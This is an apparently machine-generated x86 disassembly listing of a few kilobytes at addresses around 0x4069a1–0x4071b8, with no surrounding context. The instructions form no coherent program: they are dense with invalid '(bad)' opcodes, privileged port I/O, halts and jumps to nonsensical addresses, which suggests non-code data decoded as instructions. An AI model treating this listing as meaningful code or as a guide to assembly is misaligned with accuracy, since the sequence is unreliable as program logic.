  4069a1:	add    cl,BYTE PTR ds:0xc0bfbfe5
  4069a7:	fsubp  st(2),st
  4069a9:	enter  0xcbfb,0xf9
  4069ad:	mov    ah,0xd4
  4069af:	(bad)
  4069b2:	icebp  
  4069b3:	jecxz  0x4069b0
  4069b5:	add    dl,dl
  4069b7:	out    0xfa,al
  4069b9:	clc    
  4069ba:	add    eax,0xc00bffda
  4069bf:	jmp    0xe3c3:0xdc09d9eb
  4069c6:	test   edi,0xd3d3e8f2
  4069cc:	rol    eax,0xd4
  4069cf:	repnz leave 
  4069d1:	sti    
  4069d2:	shl    dl,cl
  4069d4:	fdecstp 
  4069d6:	in     eax,dx
  4069d7:	out    dx,al
  4069d8:	lock shl ebx,1
  4069db:	out    0xf8,al
  4069dd:	in     eax,0xdd
  4069df:	iret   
  4069e0:	or     DWORD PTR [ecx],ecx
  4069e2:	in     al,0xcb
  4069e4:	out    dx,eax
  4069e5:	lock shl esi,cl
  4069e8:	scas   al,BYTE PTR es:[edi]
  4069e9:	shl    edi,cl
  4069eb:	repnz retf 0xd2eb
  4069ef:	in     al,dx
  4069f0:	fmul   st,st(7)
  4069f2:	loop   0x4069d7
  4069f4:	mov    edx,0xdef2e7f8
  4069f9:	repz mov esp,0xaf107
  4069ff:	call   0xea0233e2
  406a04:	fxam   
  406a06:	test   ecx,0xb6d1b1c7
  406a0c:	mov    ah,0xf1
  406a0e:	in     al,dx
  406a0f:	int    0xd1
  406a11:	ror    eax,1
  406a13:	into   
  406a14:	out    dx,eax
  406a15:	out    dx,al
  406a16:	(bad)  
  406a18:	sti    
  406a19:	lds    eax,FWORD PTR [ecx]
  406a1b:	(bad)  
  406a1e:	or     eax,DWORD PTR [ebx]
  406a20:	retf   
  406a21:	jecxz  0x406a32
  406a23:	fcmove st,st(0)
  406a25:	fnstsw ax
  406a27:	in     eax,dx
  406a28:	aad    0xe0
  406a2a:	(bad)  
  406a2c:	aad    0xdf
  406a2e:	shl    dh,cl
  406a30:	(bad)  
  406a32:	retf   0xdfb4
  406a35:	rcr    ebp,1
  406a37:	(bad)  
  406a38:	out    0xd5,eax
  406a3a:	ret    0xeb02
  406a3d:	aam    0xfc
  406a3f:	or     bl,cl
  406a41:	in     al,dx
  406a42:	psllw  mm4,mm1
  406a45:	mov    esp,0xc2d5e3cb
  406a4a:	loopne 0x406a27
  406a4c:	shl    BYTE PTR [esi-0x49141508],1
  406a52:	fdivp  st(4),st
  406a54:	ret    0xd7d0
  406a57:	in     al,dx
  406a58:	pop    es
  406a59:	or     ecx,DWORD PTR [ebx]
  406a5b:	aad    0xf1
  406a5d:	hlt    
  406a5e:	cld    
  406a5f:	(bad)  
  406a60:	std    
  406a61:	jmp    0x406a6e
  406a63:	add    esp,esi
  406a65:	mov    dl,0xce
  406a67:	enter  0xc8cd,0xb3
  406a6b:	in     eax,0xe1
  406a6d:	fsubr  st,st(0)
  406a6f:	enter  0xd3be,0xf2
  406a73:	(bad)  
  406a74:	repz stc 
  406a76:	iret   
  406a77:	in     eax,0xc7
  406a79:	push   es
  406a7a:	ret    
  406a7b:	fadd   QWORD PTR [esi]
  406a7d:	neg    al
  406a7f:	jmp    0x406a55
  406a81:	clc    
  406a82:	clc    
  406a83:	in     al,0xb3
  406a85:	fsubr  QWORD PTR [eax-0x484f2c20]
  406a8b:	loopne 0x406a77
  406a8d:	out    0xda,al
  406a8f:	repnz retf 0xfacd
  406a93:	jmp    0xdfdd:0xf3c103fd
  406a9a:	in     al,0xd0
  406a9c:	out    0x4,al
  406a9e:	vpmulhw ymm0,ymm4,YMMWORD PTR [eax]
  406aa2:	out    dx,eax
  406aa3:	add    al,0xc7
  406aa5:	loop   0x406a98
  406aa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aa8:	jmp    0x406a98
  406aaa:	shr    dh,cl
  406aac:	retf   0xe4ea
  406aaf:	retf   0xf2b3
  406ab2:	mov    esp,0xe1efe9
  406ab7:	aad    0xf9
  406ab9:	ret    0xe9d7
  406abc:	xlat   BYTE PTR ds:[ebx]
  406abd:	idiv   edi
  406abf:	loope  0x406aa8
  406ac1:	pslld  mm1,mm1
  406ac4:	stos   DWORD PTR es:[edi],eax
  406ac5:	mov    esi,0xc5e3ddd7
  406aca:	ror    dh,0xed
  406acd:	mov    al,0xde
  406acf:	fcmovnbe st,st(1)
  406ad1:	stc    
  406ad2:	hlt    
  406ad3:	icebp  
  406ad4:	loope  0x406ab7
  406ad6:	rcr    eax,0xd8
  406ad9:	fcmovu st,st(6)
  406adb:	fadd   QWORD PTR [ecx]
  406add:	or     ah,ch
  406adf:	(bad)  
  406ae0:	jmp    0x406aa6
  406ae2:	add    edi,ebp
  406ae4:	in     al,0xa9
  406ae6:	jmp    0x406abd
  406ae8:	out    dx,al
  406ae9:	mov    dl,0xca
  406aeb:	mov    dh,0xaf
  406aed:	aam    0xf3
  406aef:	inc    ch
  406af1:	clc    
  406af2:	std    
  406af3:	add    edx,esi
  406af5:	fsubrp st(2),st
  406af7:	int    0xd7
  406af9:	fld    st(6)
  406afb:	(bad)
  406afe:	mov    ebp,0xe2e5e2c8
  406b03:	or     al,0xe4
  406b05:	leave  
  406b06:	out    dx,al
  406b07:	xlat   BYTE PTR ds:[ebx]
  406b08:	mov    dl,0xf2
  406b0a:	repnz loopne 0x406ae2
  406b0d:	stc    
  406b0e:	inc    dh
  406b10:	lock clc 
  406b12:	mov    ebx,0xc0dfdde2
  406b17:	fldlg2 
  406b19:	add    eax,esp
  406b1b:	fadd   QWORD PTR [ebx]
  406b1d:	call   edi
  406b1f:	call   0xcd5275e7
  406b24:	int    0xed
  406b26:	div    BYTE PTR [esi-0x3b1a0e3d]
  406b2c:	out    dx,eax
  406b2d:	shl    esi,cl
  406b2f:	rcr    ch,cl
  406b31:	stc    
  406b32:	fdivr  QWORD PTR [ebp-0x25243f32]
  406b38:	aam    0xd2
  406b3a:	hlt    
  406b3b:	hlt    
  406b3c:	shr    dl,1
  406b3e:	frndint 
  406b40:	les    eax,FWORD PTR [ecx+ebx*8]
  406b43:	add    bl,al
  406b45:	scas   eax,DWORD PTR es:[edi]
  406b46:	ret    0xb0b6
  406b49:	cmc    
  406b4a:	mov    bl,0xcb
  406b4c:	shl    ebp,1
  406b4e:	rcl    ebx,cl
  406b50:	les    edi,FWORD PTR [esi-0x210e4b1e]
  406b56:	fucomp st(6)
  406b58:	aam    0xf9
  406b5a:	rcl    esi,1
  406b5c:	pop    es
  406b5d:	push   es
  406b5e:	out    0xfd,al
  406b60:	out    dx,eax
  406b61:	in     eax,dx
  406b62:	out    0xf,al
  406b64:	repz mov bl,0xc3
  406b67:	rol    al,1
  406b69:	(bad)  
  406b6a:	aad    0xb4
  406b6c:	fidiv  DWORD PTR [edi-0xf28252b]
  406b72:	fnstcw WORD PTR [edi-0x41211c37]
  406b78:	shl    bl,1
  406b7a:	sar    BYTE PTR [esi+edi*8+0xbdffce3],0xca
  406b82:	loopne 0x406b7d
  406b84:	leave  
  406b85:	call   0xab08286a
  406b8a:	(bad)  
  406b8c:	fnstenv [eax-0x15363a0b]
  406b92:	std    
  406b93:	mov    edi,0xd5c0d9ec
  406b98:	test   eax,0xa02ddbd
  406b9e:	(bad)  
  406b9f:	out    dx,eax
  406ba0:	hlt    
  406ba1:	or     ebx,esi
  406ba3:	out    0xd0,al
  406ba5:	in     al,dx
  406ba6:	jecxz  0x406b9b
  406ba8:	fdiv   QWORD PTR [ebx-0x62b1a2f]
  406bae:	mov    eax,0xded0fde4
  406bb3:	(bad)  
  406bb5:	lock int3 
  406bb7:	lock loopne 0x406bb1
  406bba:	fiadd  DWORD PTR [esi]
  406bbc:	stc    
  406bbd:	loop   0x406b9a
  406bbf:	loop   0x406b9a
  406bc1:	call   0xed1f59a7
  406bc6:	mov    edi,0xe2f1e2c9
  406bcb:	in     al,dx
  406bcc:	mov    dh,0xbb
  406bce:	fucomip st,st(2)
  406bd0:	mov    ebx,0xc9eeeaf7
  406bd5:	(bad)  
  406bd7:	cmc    
  406bd8:	in     al,0xd0
  406bda:	icebp  
  406bdb:	or     ebp,eax
  406bdd:	retf   0xf5c1
  406be0:	out    0xd4,al
  406be2:	in     eax,0x12
  406be4:	stos   BYTE PTR es:[edi],al
  406be5:	in     eax,dx
  406be6:	rcr    esi,0xdc
  406be9:	mov    cl,0xe7
  406beb:	imul   eax
  406bed:	mov    edx,0xd2ebd5ef
  406bf2:	add    edx,esp
  406bf4:	icebp  
  406bf5:	(bad)  
  406bf6:	sti    
  406bf7:	mov    edi,0xe903ecfa
  406bfc:	in     al,0xc6
  406bfe:	fsub   st,st(2)
  406c00:	in     al,0x3
  406c02:	loopne 0x406c13
  406c04:	mov    dl,0xd2
  406c06:	enter  0xd7e6,0xe0
  406c0a:	retf   
  406c0b:	aad    0xeb
  406c0d:	mov    edx,0xd0d3ceff
  406c12:	fidivr WORD PTR [edi-0x4184137]
  406c18:	add    eax,0xc3eafa0b
  406c1d:	retf   
  406c1e:	fld    DWORD PTR [edi]
  406c20:	out    dx,eax
  406c21:	loop   0x406c09
  406c23:	int    0xd0
  406c25:	out    dx,al
  406c26:	(bad)  
  406c27:	shl    ah,0xbc
  406c2a:	repnz repz out dx,eax
  406c2d:	out    0xfe,al
  406c2f:	jmp    0x406c0c
  406c31:	add    eax,DWORD PTR [ebx]
  406c33:	add    edx,esi
  406c35:	stc    
  406c36:	fsubrp st(6),st
  406c38:	loopne 0x406c17
  406c3a:	cld    
  406c3b:	fld    DWORD PTR [edi]
  406c3d:	retf   
  406c3e:	std    
  406c3f:	cli    
  406c40:	jmp    0xc83a5b3f
  406c45:	loop   0x406bf7
  406c47:	ret    0xc6eb
  406c4a:	aam    0xd9
  406c4c:	mov    bl,0xf7
  406c4e:	in     al,dx
  406c4f:	idiv   BYTE PTR [ebx-0x4111160b]
  406c55:	div    edx
  406c57:	cld    
  406c58:	aam    0x7
  406c5a:	repnz cmc 
  406c5c:	cli    
  406c5d:	rol    BYTE PTR [eax],0xff
  406c60:	aam    0xcd
  406c62:	or     esp,ebx
  406c64:	mov    cl,0xf0
  406c66:	fsubrp st(2),st
  406c68:	mov    dl,0xd0
  406c6a:	iret   
  406c6b:	loopne 0x406c3c
  406c6d:	loopne 0x406c56
  406c6f:	jmp    0xd8d8:0xf5cab5bf
  406c76:	jecxz  0x406c68
  406c78:	out    0xe7,al
  406c7a:	push   es
  406c7b:	(bad)  
  406c7c:	or     esi,ebp
  406c7e:	jmp    0x13216e84
  406c83:	icebp  
  406c84:	loopne 0x406c4d
  406c86:	scas   al,BYTE PTR es:[edi]
  406c87:	jmp    0xb4073a6c
  406c8c:	neg    edi
  406c8e:	mov    dh,0xf9
  406c90:	rol    esp,1
  406c92:	sti    
  406c93:	(bad)  
  406c95:	stc    
  406c96:	in     eax,dx
  406c97:	xlat   BYTE PTR ds:[ebx]
  406c98:	in     eax,0xdc
  406c9a:	ret    0xfbe9
  406c9d:	leave  
  406c9e:	clc    
  406c9f:	or     ah,al
  406ca1:	in     eax,dx
  406ca2:	(bad)  
  406ca4:	out    0xf0,al
  406ca6:	out    dx,al
  406ca7:	out    dx,eax
  406ca8:	(bad)  
  406ca9:	sti    
  406caa:	test   eax,0xfaeab6e1
  406caf:	std    
  406cb0:	repnz out dx,eax
  406cb2:	in     al,dx
  406cb3:	cli    
  406cb4:	cld    
  406cb5:	shl    dl,0x1
  406cb8:	xlat   BYTE PTR ds:[ebx]
  406cb9:	fdivrp st(5),st
  406cbb:	retf   
  406cbc:	icebp  
  406cbd:	ror    BYTE PTR [esi],0xeb
  406cc0:	fucomi st,st(0)
  406cc2:	add    bl,dh
  406cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cc5:	test   eax,0xdcb6bcc8
  406cca:	int3   
  406ccb:	cmc    
  406ccc:	iret   
  406ccd:	mov    eax,0xbbf8d8f1
  406cd2:	bnd ret 
  406cd4:	rcr    ebx,1
  406cd6:	(bad)  
  406cd7:	int3   
  406cd8:	push   es
  406cd9:	std    
  406cda:	fmul   DWORD PTR [ebx]
  406cdc:	loopne 0x406cde
  406cde:	clc    
  406cdf:	jmp    0xb3b8:0xdf070afb
  406ce6:	in     eax,0xcc
  406ce8:	mov    ebp,0xf4d9d5d0
  406cee:	repnz mov dh,0xd0
  406cf1:	mov    esi,0xe300bbd4
  406cf6:	int3   
  406cf7:	mov    eax,0xd9d1ffdf
  406cfc:	loopne 0x406cbe
  406cfe:	add    cl,BYTE PTR [edi]
  406d00:	stc    
  406d01:	aam    0xca
  406d03:	int    0xca
  406d05:	loopne 0x406cf9
  406d07:	mov    dl,0xdc
  406d09:	in     al,dx
  406d0a:	jmp    0x406cc0
  406d0c:	int3   
  406d0d:	mov    dh,0xad
  406d0f:	mov    dh,0xec
  406d11:	imul   eax
  406d13:	(bad)  
  406d15:	sar    cl,0xc6
  406d18:	xlat   BYTE PTR ds:[ebx]
  406d19:	stc    
  406d1a:	clc    
  406d1b:	fsubr  st(5),st
  406d1d:	in     eax,0xc4
  406d1f:	jmp    0x406d16
  406d21:	cld    
  406d22:	fcmovne st,st(6)
  406d24:	int3   
  406d25:	into   
  406d26:	icebp  
  406d27:	int3   
  406d28:	repnz in al,dx
  406d2a:	shl    bh,1
  406d2c:	(bad)  
  406d2d:	out    0xba,al
  406d2f:	in     al,0xfe
  406d31:	cli    
  406d32:	iret   
  406d33:	(bad)  
  406d34:	(bad)  
  406d36:	in     al,dx
  406d37:	jecxz  0x406cf6
  406d39:	add    ebx,ebp
  406d3b:	add    ch,dl
  406d3d:	cmc    
  406d3e:	jecxz  0x406d3f
  406d40:	or     al,0xe8
  406d42:	retf   0xe70a
  406d45:	stos   BYTE PTR es:[edi],al
  406d46:	call   0xeb0e1dfe
  406d4b:	loopne 0x406d0d
  406d4d:	(bad)  
  406d4e:	fnstenv [esi-0x2531080c]
  406d54:	in     al,dx
  406d55:	repz std 
  406d57:	in     eax,0xf4
  406d59:	rcl    al,1
  406d5b:	out    0xe4,al
  406d5d:	add    al,0xc4
  406d5f:	fsubrp st(2),st
  406d61:	retf   0xd3dc
  406d64:	ret    
  406d65:	in     eax,dx
  406d66:	jmp    0xaff3:0xacd6b6b0
  406d6d:	in     eax,0xb6
  406d6f:	aad    0xd9
  406d71:	mov    ah,0xff
  406d73:	cld    
  406d74:	stc    
  406d75:	aad    0xdd
  406d77:	in     al,dx
  406d78:	fsubr  st(3),st
  406d7a:	hlt    
  406d7b:	aad    0xe4
  406d7d:	cld    
  406d7e:	out    dx,al
  406d7f:	jecxz  0x406d7d
  406d81:	out    0xc5,al
  406d83:	loop   0x406d47
  406d85:	mov    bl,0xc9
  406d87:	loop   0x406d79
  406d89:	scas   al,BYTE PTR es:[edi]
  406d8a:	into   
  406d8b:	shl    ebx,cl
  406d8d:	leave  
  406d8e:	jmp    0x406d40
  406d90:	fcmove st,st(0)
  406d92:	aad    0xe1
  406d94:	out    dx,al
  406d95:	out    dx,al
  406d96:	shl    dl,0xd4
  406d99:	loop   0x406d7b
  406d9b:	out    0xc0,eax
  406d9d:	mov    BYTE PTR [ecx+eiz*8],0xd
  406da1:	in     al,dx
  406da2:	in     eax,0xd2
  406da4:	mov    esi,0xe7d0d1b2
  406da9:	loop   0x406d99
  406dab:	cli    
  406dac:	(bad)
  406daf:	(bad)  
  406db0:	retf   0xd8fd
  406db3:	loop   0x406dad
  406db5:	out    0xcd,eax
  406db7:	repz mov esp,0xc60603f3
  406dbd:	in     eax,0xd9
  406dbf:	(bad)  
  406dc1:	in     al,0x5
  406dc3:	or     eax,0xb1c1c2b1
  406dc8:	mov    esp,0xb2f0f2ca
  406dcd:	shl    BYTE PTR [esi-0x1c0c404b],1
  406dd3:	add    bh,al
  406dd5:	not    dl
  406dd7:	faddp  st(3),st
  406dd9:	cld    
  406dda:	rol    BYTE PTR [esi],0xe4
  406ddd:	or     ecx,edi
  406ddf:	loopne 0x406ddc
  406de1:	add    al,0xf2
  406de3:	or     cl,al
  406de5:	test   eax,0xc0afe7b2
  406dea:	enter  0xe8ac,0xd5
  406dee:	mov    al,0xd1
  406df0:	cmc    
  406df1:	fstp   TBYTE PTR [edi-0x2108462c]
  406df7:	int    0xd5
  406df9:	hlt    
  406dfa:	out    0xe4,al
  406dfc:	(bad)  
  406dfd:	mov    esi,0xe1fbea0a
  406e02:	into   
  406e03:	retf   
  406e04:	mov    dl,0xe0
  406e06:	mov    bl,0xad
  406e08:	lds    esi,FWORD PTR [esi-0x3136371d]
  406e0e:	xlat   BYTE PTR ds:[ebx]
  406e0f:	into   
  406e10:	fdiv   st,st(4)
  406e12:	mov    ah,0xc2
  406e14:	loop   0x406df9
  406e16:	jecxz  0x406df5
  406e18:	add    al,0xb
  406e1a:	fsubr  st(4),st
  406e1c:	aad    0xe5
  406e1e:	mov    ebp,0xc5fee90f
  406e23:	retf   
  406e24:	fadd   st,st(0)
  406e26:	test   eax,0xf2b4d2e1
  406e2b:	ror    bh,1
  406e2d:	retf   
  406e2e:	iret   
  406e2f:	out    dx,al
  406e30:	hlt    
  406e31:	in     al,0xd8
  406e33:	shl    dl,1
  406e35:	call   0xf10847fa
  406e3a:	in     al,0xe9
  406e3c:	test   al,0xfb
  406e3f:	call   0xc9474326
  406e44:	enter  0xd2ec,0xac
  406e48:	out    dx,eax
  406e49:	(bad)  
  406e4a:	cmc    
  406e4b:	cli    
  406e4c:	stc    
  406e4d:	fcmove st,st(6)
  406e4f:	xlat   BYTE PTR ds:[ebx]
  406e50:	mov    esi,0xe8d1d8bb
  406e55:	repnz out dx,al
  406e57:	ret    0xf7f6
  406e5a:	or     edi,DWORD PTR [edx+edi*8-0x383ffe19]
  406e61:	adc    esp,esp
  406e63:	fldlg2 
  406e65:	les    esp,FWORD PTR [ebp-0x1e043e1e]
  406e6b:	lods   al,BYTE PTR ds:[esi]
  406e6c:	(bad)  [esi-0x2a423338]
  406e72:	call   0xc00e483f
  406e77:	add    esi,esp
  406e79:	mov    esi,0xf809e5d6
  406e7e:	push   es
  406e7f:	retf   
  406e80:	or     esp,ecx
  406e82:	fadd   QWORD PTR [ebx]
  406e84:	mov    ecx,0xd3f5a8cd
  406e89:	in     eax,0xcd
  406e8b:	out    dx,eax
  406e8c:	(bad)  
  406e8e:	aam    0xd7
  406e90:	cld    
  406e91:	cli    
  406e92:	aad    0xec
  406e94:	test   BYTE PTR [edx],0xf3
  406e97:	jecxz  0x406e55
  406e99:	jmp    0x406e7b
  406e9b:	jecxz  0x406e99
  406e9d:	loope  0x406eae
  406e9f:	retf   
  406ea0:	fcmovnu st,st(4)
  406ea2:	(bad)  
  406ea4:	fsubr  st,st(1)
  406ea6:	leave  
  406ea7:	out    0xc5,al
  406ea9:	jecxz  0x406e93
  406eab:	leave  
  406eac:	iret   
  406ead:	in     al,0xce
  406eaf:	mov    ah,0xd1
  406eb1:	aam    0xf7
  406eb3:	enter  0xd7e2,0xd5
  406eb7:	icebp  
  406eb8:	ror    BYTE PTR [ebx],1
  406eba:	loopne 0x406eb8
  406ebc:	push   es
  406ebd:	add    dh,ah
  406ebf:	fadd   DWORD PTR [edi]
  406ec1:	jmp    0x406e90
  406ec3:	fmul   st(4),st
  406ec5:	jmp    0xd7163979
  406eca:	out    dx,eax
  406ecb:	cmc    
  406ecc:	in     al,dx
  406ecd:	aad    0xf9
  406ecf:	in     eax,dx
  406ed0:	shr    dl,1
  406ed2:	stc    
  406ed3:	lock stc 
  406ed5:	mov    esi,0xdeecbce7
  406eda:	add    al,0x3
  406edc:	clc    
  406edd:	fmulp  st(3),st
  406edf:	cmc    
  406ee0:	add    eax,0xc512fde3
  406ee5:	out    dx,al
  406ee6:	ret    0xd6d7
  406ee9:	lock retf 0xbae8
  406eed:	in     al,dx
  406eee:	retf   0xb6f0
  406ef1:	enter  0xb8ff,0xd5
  406ef5:	shl    bh,1
  406ef7:	xlat   BYTE PTR ds:[ebx]
  406ef8:	sar    bl,1
  406efa:	jmp    0x406ec1
  406efc:	retf   
  406efd:	std    
  406efe:	fcomip st,st(5)
  406f00:	retf   
  406f01:	retf   
  406f02:	(bad)  
  406f03:	jmp    0xb1ed:0xb7cddfc6
  406f0a:	jecxz  0x406ed7
  406f0c:	aam    0xb5
  406f0e:	retf   
  406f0f:	mov    ebx,0xd0dbb2d8
  406f14:	fnstcw WORD PTR [edi-0x3e401f30]
  406f1a:	fadd   DWORD PTR [edx]
  406f1c:	jmp    0xdbde:0xcbfce5fb
  406f23:	add    bl,al
  406f25:	icebp  
  406f26:	icebp  
  406f27:	loop   0x406eff
  406f29:	mov    al,0xb6
  406f2b:	in     eax,0xee
  406f2d:	xlat   BYTE PTR ds:[ebx]
  406f2e:	int    0xdf
  406f30:	into   
  406f31:	xlat   BYTE PTR ds:[ebx]
  406f32:	in     al,dx
  406f33:	(bad)  
  406f34:	hlt    
  406f35:	cmc    
  406f36:	(bad)  
  406f37:	(bad)  
  406f39:	add    al,al
  406f3b:	jmp    0xfdeb:0xf9e203c3
  406f42:	fcom   QWORD PTR [ebx]
  406f44:	mov    edi,0xe9eed6bc
  406f49:	int3   
  406f4a:	hlt    
  406f4b:	aad    0xd1
  406f4d:	in     eax,dx
  406f4e:	mov    eax,0xfbbecdc4
  406f53:	leave  
  406f54:	rcr    ebp,1
  406f56:	(bad)  
  406f57:	fcom   st(2)
  406f59:	loop   0x406f5d
  406f5b:	fadd   QWORD PTR [ebx]
  406f5d:	test   esp,0xdf0bfee3
  406f63:	in     al,dx
  406f64:	jecxz  0x406f19
  406f66:	repnz in al,0xce
  406f69:	lock jmp 0x406f27
  406f6c:	scas   eax,DWORD PTR es:[edi]
  406f6d:	fcmovnu st,st(0)
  406f6f:	in     al,0xe5
  406f71:	sti    
  406f72:	cld    
  406f73:	leave  
  406f74:	jmp    0xe1fe5377
  406f79:	out    0x4,eax
  406f7b:	retf   0xff08
  406f7e:	(bad)  
  406f7f:	add    al,0xfa
  406f81:	int3   
  406f82:	in     al,0xca
  406f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f85:	out    0xec,eax
  406f87:	ror    bh,0xae
  406f8a:	lds    esi,FWORD PTR [ebx-0x2921452c]
  406f90:	clc    
  406f91:	fsubr  st,st(0)
  406f93:	fstp   st(4)
  406f95:	mov    esi,0xc400d7ee
  406f9a:	jmp    0xe8c5:0xe6e105ca
  406fa1:	fcmovnu st,st(0)
  406fa3:	rcr    ch,0xb0
  406fa6:	(bad)
  406fa9:	shr    eax,cl
  406fab:	aad    0xeb
  406fad:	in     al,0xb4
  406faf:	clc    
  406fb0:	call   0xd1172180
  406fb5:	cmc    
  406fb6:	loop   0x406fb0
  406fb8:	loopne 0x406f9b
  406fba:	(bad)
  406fbd:	add    dl,cl
  406fbf:	sar    bl,0xc4
  406fc2:	out    0xe8,eax
  406fc4:	mov    eax,0xf3c2afd2
  406fc9:	leave  
  406fca:	iret   
  406fcb:	retf   0xebce
  406fce:	in     al,0xee
  406fd0:	iret   
  406fd1:	sar    al,cl
  406fd3:	int    0xee
  406fd5:	out    0xbd,eax
  406fd7:	fdivp  st(3),st
  406fd9:	rcl    eax,0xe4
  406fdc:	add    edi,ebx
  406fde:	add    eax,0xa0ccee5
  406fe3:	in     al,dx
  406fe4:	leave  
  406fe5:	into   
  406fe6:	(bad)  
  406fe8:	cmc    
  406fe9:	scas   al,BYTE PTR es:[edi]
  406fea:	(bad)
  406fed:	loopne 0x406fb6
  406fef:	icebp  
  406ff0:	mov    ah,0xcf
  406ff2:	repnz not ecx
  406ff5:	add    BYTE PTR [edi-0x421cfe12],bh
  406ffb:	dec    edx
  406ffd:	fcmovbe st,st(4)
  406fff:	add    eax,0xae1e5ff
  407004:	scas   eax,DWORD PTR es:[edi]
  407005:	lods   al,BYTE PTR ds:[esi]
  407006:	in     al,dx
  407007:	into   
  407008:	out    0xb6,al
  40700a:	ret    0xb2e4
  40700d:	jmp    0xf31a1cda
  407012:	(bad)  
  407014:	jecxz  0x406fd9
  407016:	mov    esi,0xe1dcfedc
  40701b:	(bad)  
  40701c:	fdivrp st(6),st
  40701e:	loopne 0x407018
  407020:	or     al,0xfd
  407022:	lmsw   WORD PTR [edx-0x2c12092f]
  407029:	iret   
  40702a:	out    dx,al
  40702b:	test   al,0xb7
  40702d:	mov    cl,0xd6
  40702f:	in     eax,0xd5
  407031:	iret   
  407032:	int    0xfa
  407034:	(bad)  
  407035:	mov    edx,0xfbdbf0de
  40703a:	jmp    0x40701c
  40703c:	add    eax,0x102daf7
  407041:	retf   
  407042:	or     ebp,esp
  407044:	iret   
  407045:	scas   eax,DWORD PTR es:[edi]
  407046:	into   
  407047:	retf   0xe7ce
  40704a:	rcl    dl,1
  40704c:	out    dx,al
  40704d:	icebp  
  40704e:	mov    eax,0xeaf4edd1
  407053:	mov    ebp,0xbcc2e0d1
  407058:	(bad)  
  407059:	fdivp  st(2),st
  40705b:	rcr    dl,1
  40705d:	mov    esi,0x1ca00ef
  407062:	or     ecx,esi
  407064:	jmp    0xe1f6:0xccd0c7c5
  40706b:	iret   
  40706c:	mov    bh,0xca
  40706e:	mov    edi,0xf0dad8fb
  407073:	loope  0x40702f
  407075:	ret    
  407076:	sti    
  407077:	fnstsw WORD PTR [ebx-0x27f4213f]
  40707d:	stc    
  40707e:	ror    BYTE PTR [edx],0xcd
  407081:	stc    
  407082:	jmp    0xc2023792
  407087:	jmp    0xf5d3:0xcaccf1e7
  40708e:	in     eax,dx
  40708f:	fxam   
  407091:	shl    ch,1
  407093:	iret   
  407094:	mov    edx,0xfed1b5e3
  407099:	rol    esi,1
  40709b:	fcmovb st,st(6)
  40709d:	in     al,0xee
  40709f:	cmc    
  4070a0:	add    edi,edi
  4070a2:	std    
  4070a3:	int    0xd9
  4070a5:	mov    bl,0xed
  4070a7:	(bad)
  4070aa:	icebp  
  4070ab:	stc    
  4070ac:	loopne 0x40707c
  4070ae:	mov    cl,0xe6
  4070b0:	mov    ecx,0xbfcaeccf
  4070b5:	dec    esp
  4070b7:	shl    bh,0xe5
  4070ba:	(bad)  
  4070bc:	retf   0xe908
  4070bf:	(bad)  
  4070c0:	sti    
  4070c1:	leave  
  4070c2:	jmp    0x4070a5
  4070c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070c5:	mov    ebp,0xadcfebe1
  4070ca:	mov    ebx,0xc7f4fbea
  4070cf:	mov    ch,0xd2
  4070d1:	iret   
  4070d2:	(bad)  
  4070d4:	aam    0xd6
  4070d6:	in     al,dx
  4070d7:	sti    
  4070d8:	sti    
  4070d9:	add    dl,dl
  4070db:	cli    
  4070dc:	add    BYTE PTR [ebx],cl
  4070de:	out    0xd5,al
  4070e0:	or     esp,edx
  4070e2:	fadd   DWORD PTR [edi]
  4070e4:	test   eax,0xc2d3a5a8
  4070e9:	mov    bh,0xcd
  4070eb:	into   
  4070ec:	cli    
  4070ed:	sti    
  4070ee:	imul   bl
  4070f0:	(bad)  
  4070f3:	(bad)  
  4070f5:	into   
  4070f6:	icebp  
  4070f7:	mov    ah,0xda
  4070f9:	out    0xe1,al
  4070fb:	or     eax,eax
  4070fd:	paddb  mm5,mm2
  407100:	in     al,0xc5
  407102:	add    ecx,DWORD PTR [ebx]
  407104:	out    dx,eax
  407105:	jecxz  0x4070b3
  407107:	mov    esp,0xcfc5ced1
  40710c:	lock iret 
  40710e:	(bad)  
  40710f:	mov    eax,0xb0bbffc5
  407114:	jmp    0xd60f6bef
  407119:	repnz xlat BYTE PTR ds:[ebx]
  40711b:	cld    
  40711c:	(bad)  
  40711e:	dec    DWORD PTR [ebx]
  407120:	loopne 0x40710d
  407122:	enter  0xeddc,0xea
  407126:	jmp    0x407111
  407128:	call   0xd92235f3
  40712d:	aam    0xee
  40712f:	mov    ecx,0x1bdfed1
  407134:	jmp    0xcc44662c
  407139:	mov    esp,0xe1c3e0fa
  40713e:	fdiv   st,st(4)
  407140:	retf   0xd908
  407143:	out    dx,eax
  407144:	iret   
  407145:	int3   
  407146:	(bad)  
  407147:	lods   al,BYTE PTR ds:[esi]
  407148:	mov    ebp,0xdad7b0f2
  40714d:	mov    cl,0xfa
  40714f:	sar    ebx,1
  407151:	out    dx,eax
  407152:	push   DWORD PTR [edi+edi*8-0x38f941fd]
  407159:	xlat   BYTE PTR ds:[ebx]
  40715a:	(bad)  
  40715b:	shr    ebx,1
  40715d:	test   edi,0xe2f8fdda
  407163:	leave  
  407164:	enter  0xd1e8,0xe4
  407168:	in     eax,0xd3
  40716a:	mov    cl,0xf4
  40716c:	rol    dh,0xbf
  40716f:	(bad)  
  407170:	iret   
  407171:	mov    ch,0xde
  407173:	out    dx,al
  407174:	sar    esi,0xf8
  407177:	icebp  
  407178:	cli    
  407179:	(bad)  
  40717a:	(bad)  
  40717b:	fcmovu st,st(3)
  40717d:	or     cl,al
  40717f:	out    dx,eax
  407180:	fdivrp st(4),st
  407182:	(bad)  
  407184:	jmp    0x407168
  407186:	retf   
  407187:	out    0xd2,al
  407189:	out    dx,al
  40718a:	lods   al,BYTE PTR ds:[esi]
  40718b:	into   
  40718c:	(bad)  
  40718d:	fdiv   DWORD PTR [eax-0x242f2254]
  407193:	(bad)  
  407195:	cmc    
  407196:	hlt    
  407197:	loopne 0x407199
  407199:	(bad)  
  40719a:	shr    bl,1
  40719c:	jmp    0x4071a2
  40719e:	enter  0x8f8,0xd9
  4071a2:	clc    
  4071a3:	fsub   st(1),st
  4071a5:	lods   al,BYTE PTR ds:[esi]
  4071a6:	test   eax,0xb0f4b1c9
  4071ab:	lds    esi,FWORD PTR [edx-0x1b4628]
  4071b1:	out    dx,al
  4071b2:	rol    bl,1
  4071b4:	fcmovnbe st,st(5)
  4071b6:	push   ebx
  4071b8:	(bad)  
